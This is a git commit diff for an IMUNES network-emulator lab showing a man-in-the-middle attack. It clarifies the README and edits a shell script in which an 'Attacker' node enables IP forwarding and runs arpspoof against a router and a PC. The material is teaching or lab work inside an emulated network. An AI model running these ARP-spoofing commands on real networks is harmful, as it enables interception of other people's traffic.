6d58d4f54d0da0434cca4d1ef2d10e06fa520284
Valter Vasic <valter@cpy.nxlab.fer.hr>
2015-03-13 15:45:39 +0100

    Updated script with declarations. Updated README.

--- mitm/README.md
+++ mitm/README.md
@@ -1,9 +1,13 @@
 ## Starting the experiment
+From shell:
 ```
 # imunes -b mitm.imn
 ```
-or
+or from GUI:
 ```
 # imunes mitm.sh
 ```
-and then *Experiment -> Execute*
+and then *Experiment -> Execute*.
+
+## Check network connectivity
+
--- mitm/mitm.sh
+++ mitm/mitm.sh
@@ -1,11 +1,14 @@
 #!/bin/sh
 
+router="10.0.0.1"
+PC="10.0.0.20"
+
 # enable IP packet forwarding
 himage Attacker sysctl -w net.inet.ip.forwarding=1
 # disable sending IP redirects
 himage Attacker sysctl -w net.inet.ip.redirect=0
 
 # tell the Router that the PC has the Attacker MAC
-himage Attacker arpspoof -i eth0 -t 10.0.0.1 10.0.0.20 2> /dev/null &
+himage Attacker arpspoof -i eth0 -t $router $PC 2> /dev/null &
 # tell the PC that the router has the Attacker MAC
-himage Attacker arpspoof -i eth0 -t 10.0.0.20 10.0.0.1 2> /dev/null &
+himage Attacker arpspoof -i eth0 -t $PC $router 2> /dev/null &
